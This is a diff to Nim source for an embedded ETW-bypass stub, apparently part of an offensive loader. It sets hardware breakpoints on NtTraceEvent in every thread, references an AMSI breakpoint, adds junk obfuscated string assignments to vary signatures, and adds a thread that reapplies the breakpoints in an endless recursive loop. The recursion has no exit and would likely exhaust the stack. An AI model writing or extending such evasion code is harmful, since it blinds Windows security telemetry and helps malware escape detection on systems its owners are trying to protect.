@@ -2289,27 +2289,40 @@ let ETWStub * = """
             # Check if the thread already has a hardware breakpoint set
             if (threadCtx[i].Dr7 == 0) or (threadCtx[i].DR7 == DWORD64(0x0000000000000401)#[AMSI Hardware Breakpoint for Main Thread]#):
                 # Set the hardware breakpoint
-                var randblup5: string = obf("oihanyxbcyxm")
+                
                 enableBreakPoint(threadCtx[i], g_ntTraceEventBufferPtr, 1)
                 when defined(DInvoke):
                     if MySetThreadContext(hThread, addr threadCtx[i]) == 0:
                         when defined(verbose):
                             echo obf("[-] Failed to set thread context")
+                        else:
+                            var asd: string = obf("asdasd")
+                            var asd2: string = obf("asdasd")
+                            asd = asd2
                         return
                 else:
                     if SetThreadContext(hThread, addr threadCtx[i]) == 0:
                         when defined(verbose):
                             echo obf("[-] Failed to set thread context")
+                        else:
+                            var asd: string = obf("asdasd")
+                            var asd2: string = obf("asdasd")
+                            asd = asd2
                         return
                 
                 when defined(verbose):
                     echo obf("[+] Attached Hardware Breakpoint to Thread: ") & $threads[i]
+                else:
+                    var asd: string = obf("asdasd")
+                    var asd2: string = obf("asdasd")
+                    asd = asd2
             when defined(DInvoke):
                 discard MyCloseHandle(hThread)
             else:
                 CloseHandle(hThread)
         # After setting the Breakpoint for all current Threads, we will also set a hook on BaseThreadInitThunk to also set Breakpoints for new threads.
-        hookBaseThreadInitThunk()
+        # as we monitor for new threads and set HWBPs, we dont need to hook BaseThreadInitThunk anymore, also that did lead to crashes on win11
+        #hookBaseThreadInitThunk()
     
     # This is a Workaround for the fact, that I for the sake of xxx cannot catch the CLR Thread even with hooks. 
     # So I'm first loading CLR with harmless Code, so that the Thread exists and afterwards set Breakpoints for each Thread.
@@ -2331,6 +2344,22 @@ let ETWStub * = """
     else:
         Sleep(1500)
     SetupETWBreakpoints()
+
+
+    # a function, that will call SetupETWBreakpoints() and afterward sleep for 4 seconds. This should be done endlessly in a loop
+    proc ETWBreakpoints() =
+        when defined(DInvoke):
+            discard MySleep(4000)
+        else:
+            Sleep(4000)
+        SetupETWBreakpoints()
+        ETWBreakpoints()
+    
+    # Create a new Thread on ETWBreakPoints() to ensure, threads are properly set
+    when defined(DInvoke):
+        var hThread = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](ETWBreakpoints), nil, 0, nil)
+    else:
+        var hThread = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](ETWBreakpoints), nil, 0, nil)
 
 """
 
